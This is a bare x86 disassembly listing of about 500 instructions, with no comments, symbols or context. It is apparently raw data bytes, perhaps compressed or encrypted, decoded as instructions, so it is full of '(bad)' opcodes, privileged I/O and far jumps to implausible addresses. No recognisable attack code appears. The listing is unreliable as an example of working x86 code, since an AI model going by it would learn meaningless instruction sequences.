  41d03c:	dec    edx
  41d03d:	push   es
  41d03e:	movzx  esi,WORD PTR [ebx-0x2fd7d4d2]
  41d045:	je     0x41d062
  41d047:	mov    cl,BYTE PTR [ecx+edi*4+0x55]
  41d04b:	sbb    bl,BYTE PTR [edx+0x5153cb82]
  41d051:	dec    esp
  41d052:	add    DWORD PTR [edi],ecx
  41d054:	ins    DWORD PTR es:[edi],dx
  41d055:	adc    ah,BYTE PTR [ecx]
  41d057:	adc    al,0x2c
  41d059:	and    al,0x3c
  41d05b:	adc    ebp,ecx
  41d05d:	jae    0x41d0c9
  41d05f:	adc    eax,0xe3bed0fc
  41d064:	das    
  41d065:	iret   
  41d066:	pop    ss
  41d067:	cmp    esi,DWORD PTR [ebp-0x41f464a8]
  41d06d:	dec    esp
  41d06e:	es xor eax,0xd3c570d5
  41d074:	mov    WORD PTR [eax+0x24],fs
  41d077:	ss js  0x41d0c4
  41d07a:	or     ah,al
  41d07c:	adc    eax,0x9ef4c855
  41d081:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d082:	jmp    DWORD PTR [edi]
  41d084:	adc    ah,bh
  41d086:	in     eax,0xe
  41d088:	out    dx,al
  41d089:	in     eax,dx
  41d08a:	retf   
  41d08b:	xrstor [edi+ecx*4-0x61]
  41d090:	sbb    DWORD PTR [edx-0x9],0xffffffef
  41d094:	das    
  41d095:	add    eax,0x4869c5a
  41d09a:	xlat   BYTE PTR ds:[ebx]
  41d09b:	scas   al,BYTE PTR es:[edi]
  41d09c:	xchg   DWORD PTR [ebp+0x3a0368ea],edi
  41d0a2:	sbb    bh,BYTE PTR [edi]
  41d0a4:	inc    edx
  41d0a5:	stos   BYTE PTR es:[edi],al
  41d0a6:	popa   
  41d0a7:	scas   eax,DWORD PTR es:[edi]
  41d0a8:	add    al,0xe3
  41d0aa:	dec    edx
  41d0ab:	xchg   ebp,eax
  41d0ac:	and    bl,cl
  41d0ae:	xchg   DWORD PTR [ebp-0x57],eax
  41d0b1:	ja     0x41d102
  41d0b3:	jns    0x41d09a
  41d0b5:	add    ah,BYTE PTR [edi-0xe]
  41d0b8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d0b9:	and    al,0xd7
  41d0bb:	(bad)  
  41d0bc:	into   
  41d0bd:	es in  al,dx
  41d0bf:	cli    
  41d0c0:	stos   DWORD PTR es:[edi],eax
  41d0c1:	arpl   WORD PTR [eax],di
  41d0c3:	dec    eax
  41d0c4:	enter  0x6525,0xad
  41d0c8:	lods   ax,WORD PTR ds:[esi]
  41d0ca:	ss jp  0x41d0d6
  41d0cd:	push   esp
  41d0ce:	(bad)  
  41d0cf:	test   BYTE PTR [edi+0x68],dl
  41d0d2:	adc    al,0x1
  41d0d4:	jne    0x41d0ef
  41d0d6:	nop
  41d0d7:	pushf  
  41d0d8:	adc    eax,0xcc4a8f94
  41d0dd:	rol    BYTE PTR [ebp-0x8],0x22
  41d0e1:	je     0x41d0c0
  41d0e3:	pop    ss
  41d0e4:	jp     0x41d0a6
  41d0e6:	push   ecx
  41d0e7:	add    DWORD PTR ds:0xc8dbd12a,ebp
  41d0ed:	aam    0x24
  41d0ef:	shl    cl,1
  41d0f1:	sub    ecx,DWORD PTR [eax]
  41d0f3:	imul   ecx,ebp,0xffffffd7
  41d0f6:	mov    ebx,0x164e77e7
  41d0fb:	pop    esp
  41d0fc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d0fd:	jmp    0x8425e4e
  41d102:	dec    ebx
  41d103:	jne    0x41d0ba
  41d105:	test   eax,0xfbbbadab
  41d10a:	mov    WORD PTR [ecx+0x6f],ds
  41d10d:	mov    dl,0x8a
  41d10f:	jno    0x41d142
  41d111:	or     BYTE PTR [ecx-0x59],ch
  41d114:	sti    
  41d115:	int3   
  41d116:	stc    
  41d117:	and    edx,DWORD PTR [ebp-0x45]
  41d11a:	mov    ecx,0x2bb7aa78
  41d11f:	(bad)  
  41d120:	mov    eax,0xe68392b1
  41d125:	cmp    dh,BYTE PTR [ebx+esi*1]
  41d128:	adc    DWORD PTR [esi+eax*8+0xb],0x90d3d374
  41d130:	shl    DWORD PTR [esi+ebx*1],1
  41d133:	pushf  
  41d134:	popf   
  41d135:	xchg   BYTE PTR [eax+0x55b52313],bh
  41d13b:	sbb    eax,0x3d112efb
  41d140:	xchg   esp,eax
  41d141:	and    al,0xf4
  41d143:	jnp    0x41d165
  41d145:	out    0x46,eax
  41d147:	and    DWORD PTR [esi],esi
  41d149:	inc    edx
  41d14a:	call   0xe397c38b
  41d14f:	retf   
  41d150:	fs in  al,dx
  41d152:	imul   BYTE PTR [ecx]
  41d154:	ja     0x41d197
  41d156:	fiadd  WORD PTR [ebp-0x479740e0]
  41d15c:	mov    ah,0xf5
  41d15e:	and    esp,DWORD PTR [ecx]
  41d160:	(bad)  
  41d161:	cld    
  41d162:	mov    cl,0x40
  41d164:	add    BYTE PTR [edi-0x5abbe21b],dl
  41d16a:	out    0xc8,al
  41d16c:	or     ebp,esp
  41d16e:	sbb    al,0x2e
  41d170:	adc    eax,0x30988e9e
  41d175:	stos   DWORD PTR es:[edi],eax
  41d176:	cmp    BYTE PTR [eax+0x74],0xdb
  41d17a:	mov    eax,ds:0x4a6bb54b
  41d17f:	add    al,0x79
  41d181:	adc    ch,BYTE PTR [ecx-0x2a]
  41d184:	in     eax,0x4a
  41d186:	add    ch,BYTE PTR [ecx-0x693682e4]
  41d18c:	arpl   WORD PTR [edx+0x63f6ec47],cx
  41d192:	mov    edx,0x3d548c23
  41d197:	jp     0x41d20e
  41d199:	pop    ds
  41d19a:	jl     0x41d1f4
  41d19c:	fild   WORD PTR [ebp+0x4b]
  41d19f:	adc    BYTE PTR [esi+0x2b97a247],al
  41d1a5:	mov    ds:0x19a49a3f,al
  41d1aa:	ror    BYTE PTR [esi+0x4f],0x38
  41d1ae:	inc    eax
  41d1af:	in     eax,0xff
  41d1b1:	ret    
  41d1b2:	out    dx,al
  41d1b3:	mov    ebp,0x9b85ba45
  41d1b8:	or     edi,DWORD PTR [ecx-0x173fb2ec]
  41d1be:	clc    
  41d1bf:	xor    DWORD PTR [esi],ebx
  41d1c1:	mov    ch,0x2c
  41d1c3:	rcr    DWORD PTR ds:[ebp-0x7cd074d6],0x2d
  41d1cb:	xor    esi,DWORD PTR [edi-0x372df69f]
  41d1d1:	push   0xc7cc847
  41d1d6:	addr16 mov ds:0x9b30,al
  41d1da:	retf   0x1292
  41d1dd:	dec    esp
  41d1de:	mov    fs,esp
  41d1e0:	or     BYTE PTR [eax-0x383f9f15],cl
  41d1e6:	adc    dh,BYTE PTR [edi]
  41d1e8:	rcl    DWORD PTR [edx],1
  41d1ea:	push   esp
  41d1eb:	sbb    al,0xdf
  41d1ed:	fs out 0x6e,al
  41d1f0:	and    DWORD PTR [esi+0x5b],ebx
  41d1f3:	fisubr DWORD PTR [ecx]
  41d1f5:	pop    ecx
  41d1f6:	call   0xc8a143ee
  41d1fb:	sbb    al,0x65
  41d1fd:	mov    esi,0xfb9d07e0
  41d202:	dec    edx
  41d203:	sub    DWORD PTR [eax],edx
  41d205:	sub    DWORD PTR [ecx],0x7c
  41d208:	retf   
  41d209:	daa    
  41d20a:	or     eax,0xce8cb34e
  41d20f:	das    
  41d210:	mov    ecx,0x487de9ce
  41d215:	cmp    eax,0xbab797e7
  41d21a:	sub    ch,dl
  41d21c:	xchg   esp,eax
  41d21d:	int    0xd3
  41d21f:	leave  
  41d220:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d221:	pushf  
  41d222:	aas    
  41d223:	popf   
  41d224:	popa   
  41d225:	(bad)  
  41d226:	cmp    DWORD PTR [eax],ebx
  41d228:	and    al,0xc8
  41d22a:	outs   dx,DWORD PTR ds:[esi]
  41d22b:	hlt    
  41d22c:	or     eax,0x8e63bcc
  41d231:	jb     0x41d1c6
  41d233:	lds    eax,FWORD PTR [eiz*8+0xedb3665]
  41d23a:	jmp    0x41d230
  41d23c:	lds    edi,FWORD PTR ds:0x3c06ce7
  41d242:	lea    eax,[esi]
  41d244:	pusha  
  41d245:	xchg   BYTE PTR [esi],dh
  41d247:	sti    
  41d248:	dec    ebx
  41d249:	lods   eax,DWORD PTR ds:[esi]
  41d24a:	mov    eax,ds:0xfeb80d3c
  41d24f:	push   edx
  41d250:	pop    ss
  41d251:	clc    
  41d252:	in     eax,dx
  41d253:	lds    ebx,FWORD PTR [edx+0x60d471ec]
  41d259:	call   0xc02b07da
  41d25e:	mov    esp,0xacf4d91d
  41d263:	pop    es
  41d264:	xchg   BYTE PTR [ecx+0x15827e41],bh
  41d26a:	dec    ebx
  41d26b:	dec    edx
  41d26c:	cmp    al,0x1d
  41d26e:	push   ebx
  41d26f:	xor    ecx,DWORD PTR [edi+0x54]
  41d272:	lds    edi,FWORD PTR [eax]
  41d274:	cwde   
  41d275:	aaa    
  41d276:	dec    eax
  41d277:	arpl   WORD PTR [ecx+0xe7af067],ax
  41d27d:	cmp    DWORD PTR [eax],ebx
  41d27f:	mov    eax,0xac83c015
  41d284:	pop    esp
  41d285:	retf   
  41d286:	cmp    ecx,ebx
  41d288:	jae    0x41d25c
  41d28a:	pusha  
  41d28b:	mov    WORD PTR [ebx+0xd35ad71],cs
  41d291:	jmp    0x41d28b
  41d293:	ins    BYTE PTR es:[edi],dx
  41d294:	pop    ss
  41d295:	mov    eax,0xd8698f9f
  41d29a:	inc    edi
  41d29b:	outs   dx,BYTE PTR ds:[esi]
  41d29c:	repz retf 
  41d29e:	add    ebp,DWORD PTR [edx+0x5bd04ca4]
  41d2a4:	sub    DWORD PTR [edi-0x2ecde910],edx
  41d2aa:	cmp    edx,eax
  41d2ac:	or     eax,0x162db1ff
  41d2b1:	cmp    ebx,DWORD PTR [edi+0x69]
  41d2b4:	or     dl,bl
  41d2b6:	call   0xf0398170
  41d2bb:	stos   DWORD PTR es:[edi],eax
  41d2bc:	dec    ecx
  41d2bd:	cmp    eax,edx
  41d2bf:	popf   
  41d2c0:	mov    edi,?
  41d2c2:	lahf   
  41d2c3:	inc    edx
  41d2c4:	pop    edi
  41d2c5:	push   ebx
  41d2c6:	out    dx,eax
  41d2c7:	cdq    
  41d2c8:	push   ebx
  41d2c9:	out    0x8e,al
  41d2cb:	stos   BYTE PTR es:[edi],al
  41d2cc:	fiadd  WORD PTR [ecx+0x37]
  41d2cf:	xchg   BYTE PTR [edx+0x52],bl
  41d2d2:	bound  esi,QWORD PTR [edi-0x77]
  41d2d5:	xor    al,0x20
  41d2d7:	dec    ebx
  41d2d8:	mov    esp,0x44ff0db2
  41d2dd:	jp     0x41d2bc
  41d2df:	sbb    eax,0x2a648fa8
  41d2e4:	dec    eax
  41d2e5:	rcr    DWORD PTR [esp+ebx*2-0x3704b298],0x2a
  41d2ed:	fwait
  41d2ee:	inc    ebp
  41d2ef:	stc    
  41d2f0:	mov    cl,0x5e
  41d2f2:	aad    0x1
  41d2f4:	adc    DWORD PTR [esi],edi
  41d2f6:	pop    ds
  41d2f7:	mov    bh,0xb1
  41d2f9:	sti    
  41d2fa:	ret    0x9651
  41d2fd:	xchg   ecx,eax
  41d2fe:	clc    
  41d2ff:	mov    edx,0x381baa44
  41d304:	int    0xdb
  41d306:	scas   eax,DWORD PTR es:[edi]
  41d307:	push   esi
  41d308:	jecxz  0x41d34f
  41d30a:	inc    esp
  41d30b:	fwait
  41d30c:	jl     0x41d366
  41d30e:	ds mov cl,0xfd
  41d311:	adc    eax,0x476a327f
  41d316:	push   0xe0399500
  41d31b:	xor    dh,dh
  41d31d:	iret   
  41d31e:	popa   
  41d31f:	std    
  41d320:	pop    ds
  41d321:	shl    DWORD PTR [edi-0x33],0x45
  41d325:	in     al,0x9
  41d327:	loopne 0x41d39d
  41d329:	test   esp,edx
  41d32b:	jns    0x41d34e
  41d32d:	add    eax,0xae1dad64
  41d332:	test   eax,0x7d54ca05
  41d337:	pop    esp
  41d338:	xlat   BYTE PTR ds:[ebx]
  41d339:	push   edx
  41d33a:	sub    al,0xf5
  41d33c:	imul   esp,DWORD PTR [edi+0x74f36fe2],0xffffff93
  41d343:	ja     0x41d2fc
  41d345:	or     cl,BYTE PTR [ecx+0x6fa9ae8b]
  41d34b:	ins    BYTE PTR es:[edi],dx
  41d34c:	inc    esi
  41d34d:	cmp    DWORD PTR [edi],ebp
  41d34f:	and    BYTE PTR [edi+0x3a],0x52
  41d353:	dec    edx
  41d354:	jb     0x41d2e2
  41d356:	sbb    edi,esp
  41d358:	aam    0x2d
  41d35a:	sbb    cl,cl
  41d35c:	jno    0x41d30d
  41d35e:	imul   edx,esi,0x84af338a
  41d364:	sub    ecx,DWORD PTR [ebp+0x783cf026]
  41d36a:	mov    al,ds:0xc96079e7
  41d36f:	jmp    0xb4f77f7c
  41d374:	iret   
  41d375:	mov    ds:0x76519480,al
  41d37a:	push   ss
  41d37b:	push   ds
  41d37c:	std    
  41d37d:	add    BYTE PTR [ebp+0x3b5ab009],dl
  41d383:	test   BYTE PTR [ebx-0x59],bl
  41d386:	sub    bl,BYTE PTR [eax]
  41d388:	mov    esp,0x6753a2c2
  41d38d:	inc    esi
  41d38e:	push   ebx
  41d38f:	fs arpl cx,bp
  41d392:	inc    ecx
  41d393:	inc    ebx
  41d394:	mov    ds:0x91e4ea80,eax
  41d399:	in     eax,dx
  41d39a:	sti    
  41d39b:	add    al,dh
  41d39d:	cmp    eax,edi
  41d39f:	push   es
  41d3a0:	jmp    0x41d410
  41d3a2:	sbb    BYTE PTR ds:[eax+0x6b],dl
  41d3a6:	inc    esp
  41d3a7:	and    esp,DWORD PTR [esi+0x5f2cd9be]
  41d3ad:	fdivr  DWORD PTR [ebp+0xa0ee3d6]
  41d3b3:	mov    ds:0xd4b4220,al
  41d3b8:	js     0x41d348
  41d3ba:	jb     0x41d3c7
  41d3bc:	inc    esp
  41d3bd:	scas   eax,DWORD PTR es:[edi]
  41d3be:	pop    ss
  41d3bf:	out    dx,eax
  41d3c0:	rcr    BYTE PTR [edx-0x60],1
  41d3c3:	cmp    eax,0x7e4ca9aa
  41d3c8:	dec    edi
  41d3c9:	pusha  
  41d3ca:	neg    cl
  41d3cc:	inc    ebp
  41d3cd:	sbb    BYTE PTR [esi-0x76],ch
  41d3d0:	sahf   
  41d3d1:	popf   
  41d3d2:	outs   dx,BYTE PTR ds:[esi]
  41d3d3:	(bad)  
  41d3d5:	mov    dl,cl
  41d3d7:	stos   BYTE PTR es:[edi],al
  41d3d8:	ja     0x41d3e2
  41d3da:	imul   ebp,DWORD PTR [ebp+0x7a],0x74
  41d3de:	div    BYTE PTR [esi+0x11]
  41d3e1:	and    dh,BYTE PTR [esi]
  41d3e3:	in     eax,dx
  41d3e4:	popf   
  41d3e5:	and    DWORD PTR [edi-0x531733cd],esp
  41d3eb:	dec    ebp
  41d3ec:	out    0x48,al
  41d3ee:	push   DWORD PTR [ecx+0x1c57e10f]
  41d3f4:	mov    bl,0xe7
  41d3f6:	mov    edx,0x700b9852
  41d3fb:	das    
  41d3fc:	jecxz  0x41d428
  41d3fe:	nop
  41d3ff:	add    eax,0x1345354d
  41d404:	cs fwait
  41d406:	add    eax,0xa9abf4a3
  41d40b:	call   0x6d50f490
  41d410:	shl    esp,cl
  41d412:	push   edx
  41d413:	add    DWORD PTR [ecx+0x33],eax
  41d416:	push   0xffffffa3
  41d418:	mov    ecx,0xca539464
  41d41d:	outs   dx,BYTE PTR ds:[esi]
  41d41e:	fild   WORD PTR [esi]
  41d420:	mov    al,ds:0xc8b4f37b
  41d425:	lds    edx,FWORD PTR [ebp+0x33998a88]
  41d42b:	mov    ds:0xfd806213,eax
  41d430:	mov    dh,0xe4
  41d432:	sub    ecx,DWORD PTR [ecx]
  41d434:	mov    al,ds:0x8511f26d
  41d439:	inc    esp
  41d43a:	dec    edx
  41d43b:	xchg   ebp,eax
  41d43c:	(bad)  
  41d43d:	loop   0x41d43e
  41d43f:	mov    es,WORD PTR [ebp+0x496a1703]
  41d445:	scas   al,BYTE PTR es:[edi]
  41d446:	xchg   ecx,eax
  41d447:	push   0x9da2bc79
  41d44c:	dec    ebx
  41d44d:	cwde   
  41d44e:	ins    DWORD PTR es:[edi],dx
  41d44f:	cld    
  41d450:	lods   eax,DWORD PTR ds:[esi]
  41d451:	jmp    0x2cc6d577
  41d456:	cmp    al,0x45
  41d458:	rcr    DWORD PTR [ebp-0x78a10e65],0x31
  41d45f:	rcl    BYTE PTR [edi-0x4b],0xdd
  41d463:	stos   BYTE PTR es:[edi],al
  41d464:	push   ebp
  41d465:	adc    esi,edi
  41d467:	pushf  
  41d468:	sub    DWORD PTR [esi+edx*1+0x1c],edi
  41d46c:	or     eax,0xd9d01bd6
  41d471:	xor    bh,bl
  41d473:	or     DWORD PTR [ecx+0x35c1d788],ebp
  41d479:	and    BYTE PTR [edi],0x23
  41d47c:	add    DWORD PTR [eax],0xdfeb80ad
  41d482:	lahf   
  41d483:	ss in  eax,0x45
  41d486:	and    al,0x95
  41d488:	or     ebp,DWORD PTR [esi+0x5c668ced]
  41d48e:	pop    esi
  41d48f:	and    al,0xa6
  41d491:	rol    DWORD PTR [eax-0x78],1
  41d494:	jmp    0xea0:0xf4ee970b
  41d49b:	mov    al,0xb6
  41d49d:	sahf   
  41d49e:	push   ss
  41d49f:	int3   
  41d4a0:	xchg   BYTE PTR [eax],al
  41d4a2:	xchg   ebx,eax
  41d4a3:	aad    0xb8
  41d4a5:	adc    DWORD PTR [eax],esi
  41d4a7:	xchg   DWORD PTR [ebp-0x5b0ecff9],ebp
  41d4ad:	add    ecx,esp
  41d4af:	or     al,0x16
  41d4b1:	pop    ecx
  41d4b2:	js     0x41d4af
  41d4b4:	(bad)  
  41d4b5:	dec    ebx
  41d4b6:	scas   al,BYTE PTR es:[edi]
  41d4b7:	repnz das 
  41d4b9:	add    DWORD PTR [edx],esi
  41d4bb:	sub    BYTE PTR ds:0x4155220e,bl
  41d4c2:	std    
  41d4c3:	and    ah,BYTE PTR [edx]
  41d4c5:	add    eax,0xbd3a9773
  41d4ca:	out    dx,eax
  41d4cb:	pop    esi
  41d4cc:	xchg   edx,eax
  41d4cd:	xchg   ebx,eax
  41d4ce:	call   0xb14b:0xa3c921ae
  41d4d5:	test   al,0xe2
  41d4d7:	mov    al,gs:0xebb9a771
  41d4dd:	adc    eax,0xee737a7e
  41d4e2:	mov    bl,0xa8
  41d4e4:	sbb    dh,BYTE PTR [edx+0x4b]
  41d4e7:	shl    BYTE PTR [edx+eax*4+0x38],1
  41d4eb:	int3   
  41d4ec:	jmp    0x41d48a
  41d4ee:	dec    edx
  41d4ef:	jl     0x41d4e7
  41d4f1:	xor    BYTE PTR [eax],al
  41d4f3:	sbb    DWORD PTR [eax-0x7da06028],eax
  41d4f9:	sbb    dl,BYTE PTR [esi+eiz*1-0xc654f7]
  41d500:	daa    
  41d501:	sbb    BYTE PTR [ebp-0x19abbe17],bl
  41d507:	jbe    0x41d530
  41d509:	aam    0xd4
  41d50b:	pop    ebx
  41d50c:	nop
  41d50d:	cmp    BYTE PTR fs:[eax+0x3322538],al
  41d514:	mov    bl,0xe1
  41d516:	push   edx
  41d518:	repnz dec ebp
  41d51a:	pop    es
  41d51b:	daa    
  41d51c:	dec    ecx
  41d51d:	mov    edi,0x941cfd68
  41d522:	push   esi
  41d523:	xor    al,0xed
  41d525:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d526:	jno    0x41d54e
  41d528:	mov    ah,0xd3
  41d52a:	pop    ecx
  41d52b:	out    dx,al
  41d52c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d52d:	retf   
  41d52e:	aaa    
  41d52f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d530:	jp     0x41d4f2
  41d532:	mov    ds:0xb857b5be,eax
  41d537:	inc    ebp
  41d538:	cmp    ah,BYTE PTR [ecx+0x16f4f380]
  41d53e:	inc    edx
  41d53f:	xchg   DWORD PTR [esi],esi
  41d541:	adc    BYTE PTR [ecx-0x6f],al
  41d544:	into   
  41d545:	and    bh,BYTE PTR [edi+0x1b672163]
  41d54b:	push   ebp
  41d54c:	out    dx,al
  41d54d:	mov    esp,0x8b9da7fe
  41d552:	jge    0x41d55e
  41d554:	and    DWORD PTR [ecx],0xffffffb6
  41d557:	data16 mov BYTE PTR [ecx-0xb],dh
  41d55b:	test   eax,0x3046080d
  41d560:	(bad)  
  41d561:	bound  esi,QWORD PTR [edx]
  41d563:	jge    0x41d5be
  41d565:	pop    ss
  41d566:	out    0x5,eax
  41d568:	js     0x41d577
  41d56a:	dec    ecx
  41d56b:	mov    cl,BYTE PTR ds:0xe677e597
  41d571:	mov    esp,0xb241ea16
  41d576:	cmp    al,0xd6
  41d578:	sub    ch,BYTE PTR [ebx+0x7b]
  41d57b:	in     eax,dx
  41d57c:	or     edx,edx
  41d57e:	pop    ebx
  41d57f:	ret    
  41d580:	fisub  WORD PTR [ecx-0x4b7a13bd]
  41d586:	pop    ss
  41d587:	loopne 0x41d5b2
  41d589:	mov    eax,ds:0x7ecaa94e
  41d58e:	and    eax,0x4895ef0e
  41d593:	xlat   BYTE PTR ds:[ebx]
  41d594:	test   eax,0x73751d68
  41d599:	add    al,0x63
  41d59b:	xor    al,BYTE PTR es:[esi]
  41d59e:	gs ds inc ebx
  41d5a1:	dec    esp
  41d5a2:	sub    bl,BYTE PTR [ebp-0x29]
  41d5a5:	mov    ebx,0x91f0cdde
  41d5aa:	inc    ebx
  41d5ab:	push   esp
  41d5ac:	je     0x41d60e
  41d5ae:	sti    
  41d5af:	(bad)  [eax-0x58]
  41d5b2:	(bad)  
  41d5b3:	addr16 popf 
  41d5b5:	add    BYTE PTR [ecx],al
  41d5b7:	mov    BYTE PTR [esi-0x2b],0x6c
  41d5bb:	pop    ds
  41d5bc:	sbb    BYTE PTR [esi+0x616240f2],bl
  41d5c2:	stos   DWORD PTR es:[edi],eax
  41d5c3:	fild   WORD PTR [edi]
  41d5c5:	dec    ebp
  41d5c6:	std    
  41d5c7:	adc    DWORD PTR [edx+0x74cee3c8],0x1eeef4e3
  41d5d1:	xchg   esi,eax
  41d5d2:	sub    eax,0xff2006d9
  41d5d7:	lds    edx,FWORD PTR [edx]
  41d5d9:	fwait
  41d5da:	xchg   DWORD PTR [ebp+0x2f],eax
  41d5dd:	lock arpl WORD PTR [ebp-0x580fb9fd],dx
  41d5e4:	outs   dx,DWORD PTR ds:[esi]
  41d5e5:	xlat   BYTE PTR ds:[ebx]
  41d5e6:	jb     0x41d5bb
  41d5e8:	dec    eax
  41d5e9:	lds    edi,FWORD PTR [ecx]
  41d5eb:	stos   BYTE PTR es:[edi],al
  41d5ec:	jmp    0x8d0b:0x8d4850a8
  41d5f3:	sub    esi,esp
  41d5f5:	sbb    DWORD PTR [eax],esi
  41d5f7:	or     ebp,DWORD PTR [esi-0x50e65831]
  41d5fd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d5fe:	mov    ch,0x1a
  41d600:	div    BYTE PTR gs:[edx+0x5b]
  41d604:	(bad)  
  41d605:	stos   BYTE PTR es:[edi],al
  41d606:	stos   BYTE PTR es:[edi],al
  41d607:	shl    BYTE PTR [eax+eiz*2+0x72626c0a],0xc1
  41d60f:	ins    BYTE PTR es:[edi],dx
  41d610:	cwde   
  41d611:	mov    ah,0xe7
  41d613:	test   DWORD PTR [edi],0x3dfe0f6a
  41d619:	jo     0x41d5a3
  41d61b:	dec    edx
  41d61c:	call   0xf2222d4d
  41d621:	xchg   ecx,eax
  41d622:	call   DWORD PTR [eax]
  41d624:	(bad)  
  41d625:	sbb    al,0xeb
  41d627:	iret   
  41d628:	(bad)  
  41d62a:	pushf  
  41d62b:	sti    
  41d62c:	mov    al,0xd0
  41d62e:	enter  0xd803,0x47
  41d632:	mov    ds:0xb4cf9c71,al
  41d637:	and    eax,0x99a97722
  41d63c:	xor    edi,ebx
  41d63e:	lods   al,BYTE PTR ds:[esi]
  41d63f:	mov    esi,0xc716ae12
  41d644:	lods   eax,DWORD PTR ds:[esi]
  41d645:	cmp    dl,dl
  41d647:	cwde   
  41d648:	in     al,0xc9
  41d64a:	out    dx,al
  41d64b:	js     0x41d640
  41d64d:	mov    eax,0x5667d8cd
  41d652:	pop    ecx
  41d653:	pop    esp
  41d654:	icebp  
  41d655:	xchg   esi,eax
  41d656:	mov    ebp,0x5b99fed5
  41d65b:	push   cs
  41d65c:	dec    esi
  41d65d:	adc    cl,BYTE PTR [ecx-0x1c]
  41d660:	dec    edi
  41d661:	adc    bh,BYTE PTR [edx+eiz*4+0x2e]
  41d665:	daa    
  41d666:	xor    ecx,DWORD PTR ds:[esi-0x51]
  41d66a:	sub    dh,BYTE PTR [esi+0x36]
  41d66d:	dec    edi
  41d66e:	fdivr  DWORD PTR [edx+esi*8]
  41d671:	push   esi
  41d672:	add    edx,ebx
  41d674:	shl    DWORD PTR [edx+eiz*8],cl
  41d677:	lahf   
  41d678:	ins    BYTE PTR es:[edi],dx
  41d679:	cmp    edx,DWORD PTR [ecx-0x6e797b4a]
  41d67f:	call   0xc235287c
  41d684:	sbb    BYTE PTR [eax-0x34d203d8],0xef
  41d68b:	push   esp
  41d68c:	cli    
  41d68d:	or     eax,0x5a889f1a
  41d692:	cmp    esi,ecx
  41d694:	inc    edx
  41d695:	adc    eax,0x9944a7dc
  41d69a:	test   BYTE PTR [edx-0x4f1bf1fa],dh
  41d6a0:	in     al,0x63
  41d6a2:	xlat   BYTE PTR ds:[ebx]
  41d6a3:	aam    0xee
  41d6a5:	mov    ebp,0x7941c11e
  41d6aa:	inc    dx
  41d6ac:	hlt    
  41d6ad:	mov    ch,ch
  41d6af:	popa   
  41d6b0:	out    dx,al
  41d6b1:	pop    esi
  41d6b2:	lock icebp 
  41d6b4:	(bad)  
  41d6b5:	mov    ebx,0x4efc3292
  41d6ba:	jae    0x41d655
  41d6bc:	mov    eax,0x6e563eb9
  41d6c1:	inc    edx
  41d6c2:	add    DWORD PTR [ebp+0xfb6b2e2],ecx
  41d6c8:	adc    al,0xfb
  41d6ca:	inc    ebx
  41d6cb:	inc    ebp
  41d6cc:	mov    cs,WORD PTR [edi+ebp*1]
  41d6cf:	jp     0x41d6f0
  41d6d1:	add    ebp,esi
  41d6d3:	mov    esi,0x37c4c4ab
  41d6d8:	data16 jl 0x41d68b
  41d6db:	fucomp st(3)
  41d6dd:	cwde   
  41d6de:	js     0x41d6af
  41d6e0:	(bad)  
  41d6e1:	gs out 0xdf,eax
  41d6e4:	xor    eax,0xcb7b3b2
  41d6e9:	sub    edx,eax
  41d6eb:	pop    eax
  41d6ec:	dec    eax
  41d6ed:	and    al,0xc3
  41d6ef:	shr    edx,1
  41d6f1:	add    DWORD PTR [ecx],eax
  41d6f3:	jecxz  0x41d769
  41d6f5:	test   al,0x9a
  41d6f7:	cmp    DWORD PTR [edi],edx
  41d6f9:	bnd jg 0x41d721
  41d6fc:	neg    esp
  41d6fe:	and    al,BYTE PTR [ebp-0xd]
  41d701:	stc    
  41d702:	inc    ebx
  41d703:	add    BYTE PTR [ebp+0x2d],bh
  41d706:	inc    edi
  41d707:	js     0x41d6af
  41d709:	pop    eax
  41d70a:	sub    DWORD PTR [eax-0x1196992c],0xffffff85
  41d711:	popf   
  41d712:	stc    
  41d713:	jecxz  0x41d78e
  41d715:	js     0x41d69c
  41d717:	inc    ebx
  41d718:	sti    
  41d719:	mov    eax,0x1164c320
  41d71e:	and    eax,0x4fff165f
  41d723:	sub    al,0x63
  41d725:	pusha  
  41d726:	rep lods al,BYTE PTR ds:[esi]
  41d728:	ror    DWORD PTR [ecx+eiz*2-0x17],cl
  41d72c:	sbb    cl,bh
  41d72e:	(bad)  
  41d72f:	loopne 0x41d79b
  41d731:	arpl   WORD PTR [ebp-0x5238610b],si
  41d737:	test   eax,0x33a32707
  41d73c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d73d:	mov    ds:0x4f256daa,eax
  41d742:	loope  0x41d735
  41d744:	add    eax,0x5275b5e1
  41d749:	sahf   
  41d74a:	inc    ecx
  41d74b:	inc    esp
  41d74c:	ficom  WORD PTR [esi]
  41d74e:	nop
  41d74f:	push   eax
  41d750:	pop    edx
  41d751:	mov    al,0x99
  41d753:	or     DWORD PTR [ecx-0x14],ebp
  41d756:	and    eax,DWORD PTR [edx+0xe935334]
  41d75c:	cmp    eax,0x64152753
  41d761:	lahf   
  41d762:	push   edx
  41d763:	and    BYTE PTR [ecx+eiz*4-0x71],0xca
  41d768:	push   ecx
  41d769:	mov    cl,0x31
  41d76b:	mov    ebx,0x9de06b0
  41d770:	repnz out 0x73,al
  41d773:	xchg   ecx,eax
  41d774:	jmp    0x5480d66e
  41d779:	add    dh,BYTE PTR [di]
  41d77c:	ins    DWORD PTR es:[edi],dx
  41d77d:	mov    BYTE PTR [edx+0x53],al
  41d780:	call   0x5f4e8877
  41d785:	push   cs
  41d786:	je     0x41d737
  41d788:	adc    DWORD PTR [esi-0x7b],esp
  41d78b:	cmp    al,BYTE PTR [edi+0x7d47e69c]
  41d791:	(bad)  
  41d792:	mov    eax,0xdf8b6d72
  41d797:	into   
  41d798:	sbb    al,bl
  41d79a:	les    esp,FWORD PTR [ecx-0x2ffb8afc]
  41d7a0:	jmp    0xf0ba:0xd3f32f86
  41d7a7:	(bad)  
  41d7a9:	sub    eax,DWORD PTR [edi-0x59149eb9]
  41d7af:	push   ss
  41d7b0:	in     eax,dx
  41d7b1:	mov    dh,BYTE PTR [eax+0x9fe0d64]
  41d7b7:	mov    ebp,0x29ba2704
  41d7bc:	fcom   QWORD PTR [eax-0x44]
  41d7bf:	mov    ebx,0xb0e6ae5f
